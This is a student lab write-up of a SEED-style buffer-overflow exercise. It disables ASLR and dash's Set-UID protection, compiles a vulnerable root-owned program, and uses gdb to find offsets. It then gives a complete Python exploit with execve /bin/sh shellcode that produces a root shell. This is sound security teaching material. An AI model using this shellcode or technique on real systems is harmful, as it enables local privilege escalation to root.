# Buffer-Overflow Attack Lab - Set-UID Version

## Environment Setup

Modern operating systems have implemented several security mechanisms to make the buffer-overflow attack difficult. To simplify our attacks, we need to disable them first.

Ubuntu and several other Linux-based systems use address space randomization to randomize the starting addresses of the heap and stack. This makes guessing memory addresses extremely difficult, which is the foundation of buffer overflow attacks.

We can disable this protection with this command:

```bash
$ sudo sysctl -w kernel.randomize_va_space=0
```

We also need to run the command 
```bash 
$ sudo ln -sf /bin/zsh /bin/sh
```
Because, in recent versions of Ubuntu, /bin/sh is linked to /bin/dash, which implements a security countermeasure preventing its execution in Set-UID processes. Our exploit relies on executing /bin/sh, so we link it to /bin/zsh, which does not have this restriction, allowing us to bypass the privilege-dropping feature of dash.

# Task 1

After we compiled "call_shellcode.c", two executables were created: one for the 32 bits and other for the 64 bits. When running both of them, both opened a shell in the same directory that we ran the program in the current user "seed".

![a32](/docs/images/a32.png)
<br>
![a64](/docs/images/a64.png)

# Task 2: Understanding the Vulnerable Program

In this task, we analyzed the vulnerable program, stack.c, which contains a buffer overflow vulnerability in the bof() function. The program reads up to 517 bytes of input from a file called badfile and copies this input into a smaller buffer of 100 bytes using strcpy(). Since strcpy() does not perform boundary checks, this leads to a buffer overflow.

Our goal is to exploit this vulnerability to gain root privileges, as the program is a Set-UID root-owned executable. To do this, we need to craft the contents of badfile to overflow the buffer and inject malicious shellcode. When the overflow occurs, the program will execute our shellcode, potentially giving us a root shell.

We compiled the program with the following commands to disable security mechanisms like StackGuard and non-executable stack:

```bash
$ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
$ sudo chown root stack      # Set the program ownership to root
$ sudo chmod 4755 stack      # Enable the Set-UID bit
```
Before compiling, we needed to change the value of the variable L1 in the Makefile located in `Labsetup/code` to 111 (calculated as 100 + 8 + group number, where our group number is 3). After this change, we can simply compile by typing "make".

![make](/docs/images/make.png)
<br>
![ls](/docs/images/ls.png)

# Task 3: Launching Attack on 32-bit Program

In this step, we aim to determine the distance between the starting position of the buffer and the location of the return address in the stack, which is essential for constructing the payload for the buffer overflow attack.

Using gdb, we can investigate the stack and determine the exact addresses of the buffer and the saved return address. The base pointer (ebp) value can be retrieved with ```p $ebp```. The address of the buffer can be retrieved with ```p &buffer```.

![stack](/docs/images/stack.png)

With this values, we need to start preparing the badfile. We need to complete the exploit.py file with the values recieved from the gdb.

The atack is done on a 32-bit Program, so the shellcode used will be the 32-bit shell-code found in the ```call shellcode.c```file.

![shellcode32](/docs/images/shellcode32.png)

After this, we need to set the start position to the end of the buffer. The buffer size is 517 so we need to set the start of the usable buffer to 517-the size of the shellcode, it should be something like this:

![startpos](/docs/images/startpos.png)

We also need to change the return address, it should be set to point to the location of the shellcode within the buffer. The goal is that, after the buffer overflow, the program "returns" to this location, executing the shellcode.

In this case the buffer starts at 0xffffca18, and the shellcode is placed ```start``` bytes into the buffer, the return address might be something like:

![ret_adr](/docs/images/retadd.png)

The last thing we need to change is the offset, it determines where in the buffer the return address overwrite occurs.

![offset](/docs/images/offset.png)

The difference 0xffffca18 - 0xffffc9a1 gives us the number of bytes between the start of the buffer and the base pointer (ebp).
Since the saved return address is located 4 bytes above ebp in the stack, we add 4 to this difference to get the offset to the return address.

This offset helps us determine where to overwrite the saved return address in our buffer overflow, redirecting the execution to our shellcode.

In the end of this steps, the python script should look like this:

```bash
#!/usr/bin/python3
import sys
shellcode= (
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
"\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')
# Fill the content with NOP’s
content = bytearray(0x90 for i in range(517))
##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)
# I Need to change I
content[start:start + len(shellcode)] = shellcode
# Decide the return address value
# and put it somewhere in the payload
ret = 0xffffca18 + start  

offset = 0xffffca18 - 0xffffc9a1 + 4 
L = 4 # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
##################################################################
# Write the content to a file
with open('badfile', 'wb') as f:
	f.write(content)
```

After running the script and creating the badfile, we simply run stack-L1, which opens a shell. We can verify that we have obtained a root shell by using the `whoami` command, confirming that the current user is root.

![rootshell](/docs/images/rootshell.png)






